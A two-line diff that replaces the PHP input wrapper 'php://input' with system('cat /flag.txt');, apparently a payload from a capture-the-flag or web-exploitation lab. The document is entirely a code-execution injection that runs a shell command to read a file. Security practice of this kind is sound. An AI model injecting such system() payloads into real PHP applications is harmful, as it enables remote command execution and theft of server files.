@@ -1,1 +1,1 @@
-php://input
+system('cat /flag.txt');
